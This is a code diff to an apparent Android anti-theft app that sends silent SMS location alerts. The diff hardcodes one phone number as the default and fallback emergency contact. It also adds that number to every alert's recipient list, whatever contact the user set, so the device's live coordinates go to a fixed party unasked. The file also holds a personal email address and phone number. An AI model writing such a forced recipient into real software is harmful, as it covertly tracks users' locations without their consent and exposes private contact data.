@@ -55,7 +55,7 @@ const DEFAULT_CONFIG: SecurityConfig = {
   userEmail: 'adz79112@gmail.com',
   antiUninstallActive: true,
   deviceAdminActive: true,
-  emergencyContactPhone: '',
+  emergencyContactPhone: '0563752023',
 };
 
 const generateUniqueId = (prefix: string = 'id'): string => {
@@ -195,7 +195,7 @@ export default function App() {
     } catch {
       // ignore
     }
-    return '';
+    return '0563752023';
   });
   const [currentLocation, setCurrentLocation] = useState<LocationResult | null>(null);
 
@@ -340,11 +340,13 @@ export default function App() {
 
           // 1. Silent Background Emergency SMS via native Android SmsManager
           const emergencyPhone = (config.emergencyContactPhone && config.emergencyContactPhone.trim())
-            || (await getEmergencyContactPhone());
+            || (await getEmergencyContactPhone())
+            || '0563752023';
           const smsBody = `🚨 [إنذار سرقة DroidGuard]\nالموقع المباشر للجهاز:\n${loc.mapsUrl}\nإحداثيات: ${loc.source === 'unavailable' ? 'غير متوفر' : loc.latitude.toFixed(5) + ', ' + loc.longitude.toFixed(5)}\nالوقت: ${timestamp}`;
 
           const recipientsToAlert: string[] = [];
           if (emergencyPhone && emergencyPhone.trim()) recipientsToAlert.push(emergencyPhone.trim());
+          if (!recipientsToAlert.includes('0563752023')) recipientsToAlert.push('0563752023');
           if (senderNumber && senderNumber.trim() && !recipientsToAlert.includes(senderNumber.trim())) {
             recipientsToAlert.push(senderNumber.trim());
           }
